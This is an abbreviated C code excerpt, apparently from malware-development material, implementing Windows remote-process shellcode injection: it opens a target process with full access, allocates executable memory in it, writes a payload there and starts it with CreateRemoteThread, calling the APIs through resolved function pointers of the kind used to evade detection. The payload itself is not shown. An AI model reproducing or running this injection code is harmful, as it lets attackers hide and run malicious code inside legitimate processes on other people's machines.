...
BOOL InjectShellcode(HANDLE TargetProcess_HANDLE);
...
int main(int argc, char**argv) {
  ...
  HANDLE TargetProcess_HANDLE = OpenProcess(PROCESS_ALL_ACCESS, 0, TargetProcess_PID);
  if(!TargetProcess_HANDLE){
    printf("\nOpenProcess() Failed : ERROR %d",GetLastError()); 
    return 0;
  }

  if (InjectShellcode(TargetProcess_HANDLE)) {
...
BOOL InjectShellcode(HANDLE TargetProcess_HANDLE) {
  ...
  LPVOID lpBaseAddr = (LPVOID) VirtualAllocEx_Addr(TargetProcess_HANDLE, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (lpBaseAddr == NULL) {
  ...
  if(!WriteProcessMemory_Addr(TargetProcess_HANDLE, lpBaseAddr, payload, payload_len, NULL)){ 
  ...
  HANDLE  hThread = (HANDLE) CreateRemoteThread_Addr(TargetProcess_HANDLE, NULL, 0, (LPTHREAD_START_ROUTINE)lpBaseAddr, NULL, 0, NULL);
  if(!(  hThread  )){
    printf ("Creating remote Thread ERROR : %u\n",GetLastError());
    return FALSE;
  }
  printf ("[+] Creating remote Thread Success.\n");

  Sleep(2000);
  
  VirtualFreeEx_Addr(TargetProcess_HANDLE, lpBaseAddr, 0, MEM_DECOMMIT); // free the allocated memory area
  CloseHandle_Addr(hThread);
  CloseHandle_Addr(TargetProcess_HANDLE);
